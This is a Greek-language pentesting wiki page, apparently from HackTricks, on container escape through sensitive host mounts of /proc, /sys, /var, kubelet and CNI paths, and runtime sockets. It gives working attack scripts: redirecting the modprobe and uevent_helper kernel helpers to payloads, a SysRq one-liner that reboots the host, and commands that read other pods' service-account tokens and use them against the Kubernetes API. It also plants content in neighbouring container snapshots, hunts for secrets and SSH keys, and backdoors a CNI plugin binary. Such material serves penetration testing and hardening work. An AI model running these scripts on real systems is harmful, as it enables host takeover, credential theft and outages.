# Ευαίσθητες προσαρτήσεις host

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Οι προσαρτήσεις host είναι από τις σημαντικότερες πρακτικές επιφάνειες container-escape, επειδή συχνά καταργούν στην πράξη την προσεκτικά απομονωμένη οπτική ενός process και επαναφέρουν άμεση ορατότητα σε πόρους του host. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Τα bind mounts των `/proc`, `/sys`, `/var`, των runtime sockets, της κατάστασης που διαχειρίζεται το kubelet ή διαδρομών σχετικών με συσκευές μπορούν να εκθέσουν ελέγχους του kernel, διαπιστευτήρια, filesystems γειτονικών containers και interfaces διαχείρισης του runtime.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις επιμέρους σελίδες προστασίας, επειδή το μοντέλο κατάχρησης αφορά πολλαπλές πτυχές. Μια εγγράψιμη προσάρτηση host είναι επικίνδυνη εν μέρει λόγω των mount namespaces, εν μέρει λόγω των user namespaces, εν μέρει λόγω της κάλυψης από το AppArmor ή το SELinux και εν μέρει λόγω της συγκεκριμένης διαδρομής του host που εκτέθηκε. Η εξέτασή της ως ξεχωριστού θέματος διευκολύνει σημαντικά την ανάλυση της επιφάνειας επίθεσης.

Συγκρίνετε επίσης έναν εγγράψιμο κατάλογο του host με την αντίστοιχη διαδρομή μέσα σε κάθε container. Αν έχει προσαρτηθεί πάνω σε έναν κατάλογο με εκτελέσιμα startup scripts, ένας χρήστης χαμηλότερων δικαιωμάτων στο host ενδέχεται να μπορεί να τοποθετήσει εκεί κώδικα, τον οποίο θα φορτώσει το entrypoint ενός container υψηλότερων δικαιωμάτων στην επόμενη επανεκκίνησή του. Επιβεβαιώστε την ακριβή πηγή και τον προορισμό του bind, τα δικαιώματα εγγραφής/αναζήτησης του καταλόγου, τον βρόχο του entrypoint και την απαίτηση για εκτελέσιμο αρχείο, το UID του runtime και ένα πραγματικό trigger επανεκκίνησης. Το UID 0 του container δεν είναι αυτομάτως το UID 0 του host· η αντιστοίχιση user namespace και η πολιτική mount καθορίζουν την επίδραση στο host. Η παθητική ανασκόπηση πρέπει να καταγράφει διαδρομές και δικαιώματα, χωρίς να γράφει script ή να επανεκκινεί το workload.

Ένα Linux container μπορεί να βρίσκεται μέσα σε μια VM διαχείρισης που μοιράζεται μέρος ενός ξεχωριστού filesystem Windows host. Οι [κοινόχρηστοι φάκελοι VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) είναι ένας τρόπος με τον οποίο αρχεία του host γίνονται ορατά σε έναν guest, αλλά το root σε εκείνη τη VM εξακολουθεί να είναι διαφορετική ταυτότητα από έναν διαχειριστή Windows. Αν το share εκθέτει το ιδιωτικό SSH key ενός χρήστη με δικαίωμα ανάγνωσης, αντιμετωπίστε το ως ένδειξη για διαπιστευτήρια: επαληθεύστε την ακριβή mount που υποστηρίζεται από τον host, την ιδιοκτησία και την πρόσβαση στο key, τον αντίστοιχο λογαριασμό και την **ενεργή** πολιτική authorized-key του SSH server των Windows, προτού καταλήξετε ότι επιτρέπει σύνδεση στον host. Το σύγχρονο [OpenSSH των Windows](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) χρησιμοποιεί συνήθως ξεχωριστό αρχείο `administrators_authorized_keys` για λογαριασμούς διαχειριστών. Μην συμπεριλαμβάνετε το περιεχόμενο ιδιωτικών key στα συνηθισμένα αποτελέσματα απαρίθμησης· τα μεταδεδομένα του mount και της διαδρομής του key αρκούν για παθητική αρχική διαλογή.

## Έκθεση του `/proc`

Το procfs περιέχει τόσο συνήθεις πληροφορίες διεργασιών όσο και interfaces ελέγχου του kernel με σημαντικό αντίκτυπο. Επομένως, ένα bind mount όπως το `-v /proc:/host/proc` ή μια προβολή του container που εκθέτει απροσδόκητες εγγράψιμες καταχωρίσεις proc μπορεί να οδηγήσει σε αποκάλυψη πληροφοριών, άρνηση υπηρεσίας ή άμεση εκτέλεση κώδικα στο host.

Σημαντικές διαδρομές procfs περιλαμβάνουν:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (ειδικά τα `register` και `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Κατάχρηση

Ξεκινήστε ελέγχοντας ποιες σημαντικές καταχωρίσεις procfs είναι ορατές ή εγγράψιμες:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Αυτές οι διαδρομές είναι ενδιαφέρουσες για διαφορετικούς λόγους. Τα `core_pattern`, `modprobe` και `binfmt_misc` μπορούν να γίνουν διαδρομές εκτέλεσης κώδικα στο host όταν είναι εγγράψιμα. Τα `kallsyms`, `kmsg`, `kcore` και `config.gz` αποτελούν ισχυρές πηγές αναγνώρισης για kernel exploitation. Τα `sched_debug` και `mountinfo` αποκαλύπτουν πληροφορίες για διεργασίες, cgroup και filesystem, οι οποίες μπορούν να βοηθήσουν στην ανακατασκευή της διάταξης του host μέσα από το container.

Η πρακτική αξία κάθε διαδρομής διαφέρει, και η αντιμετώπισή τους σαν να είχαν όλες τον ίδιο αντίκτυπο δυσκολεύει την αξιολόγηση:

- `/proc/sys/kernel/core_pattern`
  Αν είναι εγγράψιμο, πρόκειται για μία από τις διαδρομές procfs με τον μεγαλύτερο αντίκτυπο, επειδή ο kernel εκτελεί έναν pipe handler μετά από κατάρρευση. Ένα container που μπορεί να ορίσει το `core_pattern` ώστε να δείχνει σε ένα payload αποθηκευμένο στο overlay του ή σε μια προσαρτημένη διαδρομή του host, μπορεί συχνά να αποκτήσει εκτέλεση κώδικα στο host. Δείτε επίσης το [read-only-paths.md](protections/read-only-paths.md) για ένα ειδικό παράδειγμα.
- `/proc/sys/kernel/modprobe`
  Αυτή η διαδρομή ελέγχει το userspace helper που χρησιμοποιεί ο kernel όταν χρειάζεται να καλέσει τη λογική φόρτωσης modules. Αν είναι εγγράψιμη από το container και ερμηνεύεται στο context του host, μπορεί να αποτελέσει έναν ακόμη primitive εκτέλεσης κώδικα στο host. Είναι ιδιαίτερα ενδιαφέρουσα όταν συνδυάζεται με τρόπο ενεργοποίησης της διαδρομής helper.
- `/proc/sys/vm/panic_on_oom`
  Συνήθως δεν αποτελεί καθαρό primitive διαφυγής, αλλά μπορεί να μετατρέψει την πίεση μνήμης σε άρνηση υπηρεσίας σε επίπεδο host, προκαλώντας συμπεριφορά kernel panic σε συνθήκες OOM.
- `/proc/sys/fs/binfmt_misc`
  Αν το interface εγγραφής είναι εγγράψιμο, ο attacker μπορεί να καταχωρίσει έναν handler για μια επιλεγμένη μαγική τιμή και να αποκτήσει εκτέλεση στο context του host όταν εκτελεστεί ένα αρχείο που ταιριάζει.
- `/proc/config.gz`
  Χρήσιμο για την αξιολόγηση kernel exploit. Βοηθά να διαπιστωθεί ποια subsystems, mitigations και προαιρετικά χαρακτηριστικά του kernel είναι ενεργοποιημένα, χωρίς να απαιτούνται τα metadata των πακέτων του host.
- `/proc/sysrq-trigger`
  Κυρίως διαδρομή άρνησης υπηρεσίας, αλλά πολύ σοβαρή. Μπορεί να επανεκκινήσει, να προκαλέσει panic ή να διαταράξει άμεσα με άλλον τρόπο τη λειτουργία του host.
- `/proc/kmsg`
  Αποκαλύπτει τα μηνύματα του kernel ring buffer. Είναι χρήσιμο για fingerprinting του host, ανάλυση καταρρεύσεων και, σε ορισμένα περιβάλλοντα, για leak πληροφοριών που βοηθούν στο kernel exploitation.
- `/proc/kallsyms`
  Είναι πολύτιμο όταν είναι αναγνώσιμο, επειδή αποκαλύπτει πληροφορίες για τα exported kernel symbols και μπορεί να βοηθήσει στην παράκαμψη παραδοχών address randomization κατά την ανάπτυξη kernel exploit.
- `/proc/[pid]/mem`
  Πρόκειται για άμεσο interface στη μνήμη διεργασίας. Αν η διεργασία-στόχος είναι προσβάσιμη υπό τις απαραίτητες συνθήκες τύπου ptrace, μπορεί να επιτρέψει την ανάγνωση ή την τροποποίηση της μνήμης άλλης διεργασίας. Ο πραγματικός αντίκτυπος εξαρτάται σε μεγάλο βαθμό από τα credentials, το `hidepid`, το Yama και τους περιορισμούς ptrace, επομένως πρόκειται για ισχυρή αλλά υπό προϋποθέσεις διαδρομή.
- `/proc/kcore`
  Εκθέτει μια προβολή της μνήμης του συστήματος παρόμοια με core image. Το αρχείο είναι τεράστιο και δύσχρηστο, αλλά αν είναι ουσιαστικά αναγνώσιμο, αυτό υποδεικνύει ότι η επιφάνεια μνήμης του host είναι σοβαρά εκτεθειμένη.
- `/dev/kmem` και `/dev/mem`
  Πρόκειται για raw-memory **device** interfaces με ιστορικά μεγάλο αντίκτυπο, όχι για αρχεία procfs. Σε πολλά σύγχρονα συστήματα απουσιάζουν ή είναι αυστηρά περιορισμένα, αλλά ένα container που μπορεί να ανοίξει ένα αντίγραφο προσαρτημένο από το host θα πρέπει να αντιμετωπίζει την έκθεση ως κρίσιμη. Εξετάστε τα μαζί με άλλα ευαίσθητα mounts του `/dev` αντί να αναζητάτε τις ανύπαρκτες διαδρομές `/proc/kmem` ή `/proc/mem`.
- `/proc/sched_debug`
  Διαρρέει πληροφορίες προγραμματισμού και εργασιών, οι οποίες μπορεί να αποκαλύψουν ταυτότητες διεργασιών του host ακόμη κι όταν άλλες προβολές διεργασιών φαίνονται πιο περιορισμένες από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
  Είναι εξαιρετικά χρήσιμο για την ανακατασκευή της πραγματικής θέσης του container στο host, τον εντοπισμό των διαδρομών που υποστηρίζονται από overlay και τη διαπίστωση του αν ένα εγγράψιμο mount αντιστοιχεί σε περιεχόμενο του host ή μόνο στο επίπεδο του container.

Αν τα `/proc/[pid]/mountinfo` ή οι λεπτομέρειες του overlay είναι αναγνώσιμα, χρησιμοποιήστε τα για να εντοπίσετε τη διαδρομή του filesystem του container στο host:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Αυτές οι εντολές είναι χρήσιμες, επειδή αρκετά κόλπα για εκτέλεση στον host απαιτούν τη μετατροπή μιας διαδρομής μέσα στο container στην αντίστοιχη διαδρομή από την οπτική του host.

### Παράδειγμα: Προετοιμασία διαδρομής helper `modprobe`

Αν το `/proc/sys/kernel/modprobe` είναι εγγράψιμο από το container και η διαδρομή του helper ερμηνεύεται στο context του host, μπορεί να ανακατευθυνθεί σε payload που ελέγχει ο επιτιθέμενος. Ο upper directory του overlay πρέπει να επιλυθεί από τον host, ενώ το proof output πρέπει να γραφτεί πίσω στο ίδιο container layer που είναι ορατό στον host, αν το container δεν προσαρτά επίσης το `/tmp` του host:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Το ακριβές trigger εξαρτάται από τον στόχο και τη συμπεριφορά του kernel και σκόπιμα δεν γίνεται εικασία. Επαναφέρετε την αρχική τιμή πριν φύγετε από το lab. Το σημαντικό είναι ότι μια εγγράψιμη διαδρομή helper μπορεί να ανακατευθύνει μια μελλοντική κλήση kernel helper σε περιεχόμενο διαδρομής host που ελέγχεται από attacker. Ένα overlay χωρίς `upperdir`, μια διαδρομή που δεν μπορεί να επιλύσει το host, ένα read-only mount sysctl ή ένας kernel που δεν καλεί ποτέ τον επιλεγμένο helper διακόπτει αυτή την αλυσίδα.

### Πλήρες παράδειγμα: Αναγνώριση kernel με `kallsyms`, `kmsg` και `config.gz`

Αν ο στόχος είναι η αξιολόγηση της δυνατότητας εκμετάλλευσης και όχι η άμεση διαφυγή:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Αυτές οι εντολές βοηθούν να διαπιστώσετε αν είναι ορατές χρήσιμες πληροφορίες συμβόλων, αν τα πρόσφατα μηνύματα του kernel αποκαλύπτουν ενδιαφέρουσα κατάσταση και ποιες δυνατότητες ή μετριασμοί του kernel έχουν ενσωματωθεί. Ο αντίκτυπος συνήθως δεν είναι άμεσο escape, αλλά μπορούν να συντομεύσουν σημαντικά την αξιολόγηση ευπαθειών του kernel.

### Πλήρες Παράδειγμα: Επανεκκίνηση του Host μέσω SysRq

Αν το `/proc/sysrq-trigger` είναι εγγράψιμο και παρέχει πρόσβαση στην οπτική του host:

```bash
echo b > /proc/sysrq-trigger
```

Το αποτέλεσμα είναι άμεση επανεκκίνηση του host. Δεν πρόκειται για διακριτικό παράδειγμα, αλλά δείχνει ξεκάθαρα ότι η έκθεση του procfs μπορεί να έχει πολύ σοβαρότερες συνέπειες από την αποκάλυψη πληροφοριών.

## Έκθεση του `/sys`

Το sysfs εκθέτει μεγάλες ποσότητες κατάστασης του kernel και των συσκευών. Ορισμένα paths του sysfs είναι κυρίως χρήσιμα για fingerprinting, ενώ άλλα μπορούν να επηρεάσουν την εκτέλεση helper, τη συμπεριφορά συσκευών, τη διαμόρφωση των security modules ή την κατάσταση του firmware.

Σημαντικά paths του sysfs περιλαμβάνουν:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Αυτά τα paths έχουν σημασία για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει τη συμπεριφορά διαχείρισης της θερμοκρασίας και, επομένως, τη σταθερότητα του host σε περιβάλλοντα με εσφαλμένη έκθεση. Το `/sys/kernel/vmcoreinfo` μπορεί να προκαλέσει leak πληροφοριών για crash dump και τη διάταξη του kernel, οι οποίες βοηθούν στο low-level fingerprinting του host. Το `/sys/kernel/security` είναι το interface `securityfs` που χρησιμοποιούν τα Linux Security Modules, επομένως η μη αναμενόμενη πρόσβαση εκεί μπορεί να εκθέσει ή να τροποποιήσει κατάσταση σχετική με το MAC. Τα paths των μεταβλητών EFI μπορούν να επηρεάσουν τις ρυθμίσεις εκκίνησης που υποστηρίζονται από το firmware, καθιστώντας τα πολύ πιο επικίνδυνα από τα συνηθισμένα αρχεία διαμόρφωσης. Το `debugfs` στο `/sys/kernel/debug` είναι ιδιαίτερα επικίνδυνο, επειδή αποτελεί εξ ορισμού interface για προγραμματιστές, με πολύ λιγότερες απαιτήσεις ασφάλειας από τα hardened API του kernel που προορίζονται για περιβάλλοντα παραγωγής.

Κάθε καταχώριση sysfs σε αυτήν τη λίστα εξαρτάται από τον **kernel, τη διαμόρφωση και το hardware**. Οι τρέχοντες εικονικοποιημένοι κόμβοι συνήθως δεν περιλαμβάνουν καθόλου τα `uevent_helper`, τις μεταβλητές EFI και τις καταχωρίσεις θερμικών συσκευών. Καταγράψτε ένα path που απουσιάζει ως αρνητική προϋπόθεση, αντί να υποθέτετε ότι ισχύει ένα παράδειγμα από άλλον kernel.

Χρήσιμες εντολές για την επισκόπηση αυτών των paths είναι οι εξής:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Τι κάνει αυτές τις εντολές ενδιαφέρουσες:

- Το `/sys/kernel/security` μπορεί να αποκαλύψει αν το AppArmor, το SELinux ή κάποια άλλη επιφάνεια LSM είναι ορατή με τρόπο που θα έπρεπε να είναι προσβάσιμη μόνο από το host.
- Το `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα σε αυτή την ομάδα. Αν το `debugfs` είναι προσαρτημένο και έχει δικαιώματα ανάγνωσης ή εγγραφής, αναμένεται ευρεία επιφάνεια που αλληλεπιδρά με τον kernel, με τον ακριβή κίνδυνο να εξαρτάται από τους ενεργοποιημένους κόμβους debug.
- Η έκθεση μεταβλητών EFI είναι λιγότερο συνηθισμένη, αλλά, αν υπάρχει, έχει μεγάλο αντίκτυπο, επειδή αφορά ρυθμίσεις που βασίζονται στο firmware και όχι συνηθισμένα αρχεία χρόνου εκτέλεσης.
- Το `/sys/class/thermal` αφορά κυρίως τη σταθερότητα του host και την αλληλεπίδραση με το υλικό, όχι κάποιο απλό escape τύπου shell.
- Το `/sys/kernel/vmcoreinfo` είναι κυρίως πηγή για ταυτοποίηση του host και ανάλυση crash, χρήσιμη για την κατανόηση της κατάστασης του kernel σε χαμηλό επίπεδο.

### Πλήρες παράδειγμα: `uevent_helper`

Το `/sys/kernel/uevent_helper` εξαρτάται από τον kernel και τη διαμόρφωσή του και απουσιάζει από πολλά σύγχρονα συστήματα. Αν υπάρχει, είναι εγγράψιμο και είναι διαθέσιμο ένα λειτουργικό trigger `uevent`, ο kernel ενδέχεται να εκτελέσει ένα helper που ελέγχεται από τον εισβολέα. Για την απόδειξη, το output πρέπει να χρησιμοποιεί μια διαδρομή ορατή τόσο από το host όσο και από το container:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Ο λόγος που λειτουργεί είναι ότι η διαδρομή του helper ερμηνεύεται από την οπτική του host. Μόλις ενεργοποιηθεί, ο helper εκτελείται στο context του host και όχι μέσα στο τρέχον container. Το `/sys/class/mem/null/uevent` είναι ένα συγκεκριμένο trigger σε kernels που το εκθέτουν· άλλες συσκευές ενδέχεται να εκθέτουν τα δικά τους αρχεία `uevent`, αλλά μην επιλέγετε κάποιο στην τύχη σε πραγματικό hardware. Επαναφέρετε την αρχική τιμή πριν αποχωρήσετε από το lab. Μην αναφέρετε αυτή την τεχνική ως διαθέσιμη αν απουσιάζει το αρχείο helper ή ένα ελεγχόμενο trigger.

## Έκθεση του `/var`

Η προσάρτηση του `/var` του host σε ένα container συχνά υποτιμάται, επειδή δεν φαίνεται τόσο εντυπωσιακή όσο η προσάρτηση του `/`. Στην πράξη, μπορεί να αρκεί για πρόσβαση σε sockets runtime, καταλόγους snapshot των containers, volumes pod υπό τη διαχείριση του kubelet, projected service-account tokens και filesystems γειτονικών εφαρμογών. Σε σύγχρονους κόμβους, το `/var` είναι συχνά το σημείο όπου βρίσκεται στην πραγματικότητα η πιο σημαντική επιχειρησιακά κατάσταση των containers.

### Παράδειγμα Kubernetes

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει projected tokens άλλων pods και περιεχόμενο overlay snapshot:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Αυτές οι εντολές είναι χρήσιμες, επειδή δείχνουν αν το mount εκθέτει μόνο ασήμαντα δεδομένα εφαρμογών ή διαπιστευτήρια cluster υψηλού αντίκτυπου. Ένα αναγνώσιμο service-account token μπορεί να μετατρέψει άμεσα την τοπική εκτέλεση κώδικα σε πρόσβαση στο Kubernetes API.

Αν υπάρχει το token, επαληθεύστε σε τι έχει πρόσβαση αντί να σταματήσετε μόλις το εντοπίσετε:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Ο αντίκτυπος εδώ μπορεί να είναι πολύ μεγαλύτερος από την πρόσβαση σε έναν τοπικό κόμβο. Ένα token με εκτεταμένα δικαιώματα RBAC μπορεί να μετατρέψει ένα προσαρτημένο `/var` σε παραβίαση ολόκληρου του cluster.

### Παράδειγμα Docker και containerd

Σε hosts Docker τα σχετικά δεδομένα βρίσκονται συχνά στο `/var/lib/docker`, ενώ σε κόμβους Kubernetes που βασίζονται στο containerd μπορεί να βρίσκονται στο `/var/lib/containerd` ή σε διαδρομές ειδικές για το snapshotter:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Αν το προσαρτημένο `/var` εκθέτει εγγράψιμα περιεχόμενα snapshot κάποιου άλλου workload, ο επιτιθέμενος μπορεί να είναι σε θέση να τροποποιήσει αρχεία εφαρμογών, να τοποθετήσει web περιεχόμενο ή να αλλάξει scripts εκκίνησης χωρίς να αγγίξει τη διαμόρφωση του τρέχοντος container.

Σε ένα **προσωρινό workload εργαστηρίου**, τα εγγράψιμα περιεχόμενα snapshot μπορούν να χρησιμοποιηθούν για να επιδειχθεί παραποίηση εφαρμογών, ανάκτηση μυστικών ή πλευρική μετακίνηση. Αντιστοιχίστε πρώτα το runtime container ID στο ακριβές snapshot και μην τροποποιείτε ποτέ άσχετο snapshot ή snapshot παραγωγής:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν τις τρεις κύριες κατηγορίες επιπτώσεων από το mount του `/var`: παραποίηση εφαρμογών, ανάκτηση secrets και lateral movement σε γειτονικά workloads.

Οι απευθείας εγγραφές σε snapshot παρακάμπτουν την κανονική διαχείριση κατάστασης του runtime και μπορούν να καταστρέψουν το container ή να καταστρέψουν στοιχεία. Η ανακάλυψη μόνο για ανάγνωση αναπαράχθηκε τοπικά με το Docker `overlay2`: ένα marker που γράφτηκε σε γειτονικό, προσωρινό container εμφανίστηκε κάτω από το `/var/lib/docker/overlay2/<id>/diff/`. Περιορίστε κάθε πραγματική τροποποίηση snapshot σε ένα προσωρινό container που δημιουργήθηκε για αυτήν τη δοκιμή.

## Κατάσταση Kubelet, Plugins Και Διαδρομές CNI

Ένα mount του `/var/lib/kubelet`, του `/opt/cni/bin` ή του `/etc/cni/net.d` εκτίθεται συχνά μέσω προνομιούχων DaemonSets, CNI agents, CSI node plugins, GPU operators και storage helpers. Είναι εύκολο να απορρίψει κανείς αυτά τα mounts ως «υποδομή του node», αλλά βρίσκονται απευθείας στη διαδρομή εκτέλεσης νέων pods και συχνά περιέχουν credentials του kubelet, projected secrets, sockets εγγραφής και εκτελέσιμα binaries plugins στην πλευρά του host.

Οι στόχοι υψηλής αξίας περιλαμβάνουν:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Χρήσιμες εντολές ελέγχου είναι:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Γιατί έχουν σημασία αυτές οι διαδρομές:

- Το `/var/lib/kubelet/pki` μπορεί να αποκαλύψει πιστοποιητικά client του kubelet και άλλα διαπιστευτήρια τοπικά στον κόμβο, τα οποία μερικές φορές μπορούν να επαναχρησιμοποιηθούν έναντι του API server ή των TLS endpoints του kubelet, ανάλογα με τον σχεδιασμό του cluster.<sup>[[1]](#references)</sup>
- Το `/var/lib/kubelet/pods` συχνά περιέχει προβεβλημένα tokens service-account και προσαρτημένα Secrets για γειτονικά pods στον ίδιο κόμβο.
- Το `/var/lib/kubelet/pod-resources/kubelet.sock` είναι κυρίως επιφάνεια αναγνώρισης, αλλά πολύ χρήσιμη: αποκαλύπτει ποια pods και containers χρησιμοποιούν αυτήν τη στιγμή GPU, hugepages, συσκευές SR-IOV και άλλους σπάνιους πόρους τοπικούς στον κόμβο.<sup>[[1]](#references)</sup>
- Τα `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` και `/var/lib/kubelet/plugins_registry` αποκαλύπτουν ποια CSI, DRA και device plugins είναι εγκατεστημένα και με ποια sockets αναμένεται να επικοινωνεί το kubelet. Αν αυτοί οι κατάλογοι είναι εγγράψιμοι και όχι απλώς αναγνώσιμοι, το εύρημα γίνεται πολύ σοβαρότερο.<sup>[[1]](#references)</sup>
- Τα `/opt/cni/bin` και `/etc/cni/net.d` βρίσκονται απευθείας στη διαδρομή ρύθμισης του δικτύου των pods. Η εγγράψιμη πρόσβαση εκεί συχνά αποτελεί μηχανισμό εκτέλεσης κώδικα στον host με καθυστέρηση και όχι απλώς έκθεση ρυθμίσεων.<sup>[[2]](#references)</sup>

### Πλήρες παράδειγμα: Εγγράψιμο `/opt/cni/bin`

Αν ένας κατάλογος host CNI binaries είναι προσαρτημένος με πρόσβαση ανάγνωσης-εγγραφής, η αντικατάσταση ενός plugin μπορεί να αρκεί για να αποκτηθεί εκτέλεση κώδικα στον host την επόμενη φορά που το kubelet θα δημιουργήσει ένα pod sandbox σε αυτόν τον κόμβο:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Αυτό δεν είναι τόσο άμεσο όσο ένα προσαρτημένο `docker.sock`, αλλά είναι συχνά πιο ρεαλιστικό σε παραβιασμένα Kubernetes pods υποδομής. Ο δείκτης γράφεται δίπλα στο προσαρτημένο plugin, ώστε το container να μπορεί να τον ανακτήσει ακόμη και χωρίς προσάρτηση του host-root ή του host-`/tmp`. Το wrapper διατηρεί τα αρχικά ορίσματα και την τυπική είσοδο και, στη συνέχεια, το παράδειγμα επαναφέρει το αρχικό binary. Το σημαντικό είναι ότι το τροποποιημένο binary εκτελείται αργότερα από τη ροή ρύθμισης δικτύου του host και όχι από το τρέχον container. Χρησιμοποιήστε μόνο έναν node που μπορεί να απορριφθεί, επειδή ένα μη έγκυρο wrapper μπορεί να εμποδίσει τη δικτύωση για νέα Pod sandboxes.

## Sockets χρόνου εκτέλεσης

Οι ευαίσθητες προσαρτήσεις του host συχνά περιλαμβάνουν sockets χρόνου εκτέλεσης αντί για ολόκληρους καταλόγους. Είναι τόσο σημαντικά, ώστε αξίζει να τα επαναλάβουμε ρητά εδώ:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Δείτε το [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για τις πλήρεις ροές εκμετάλλευσης μόλις προσαρτηθεί ένα από αυτά τα sockets.

Ως ένα γρήγορο μοτίβο αρχικής αλληλεπίδρασης:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

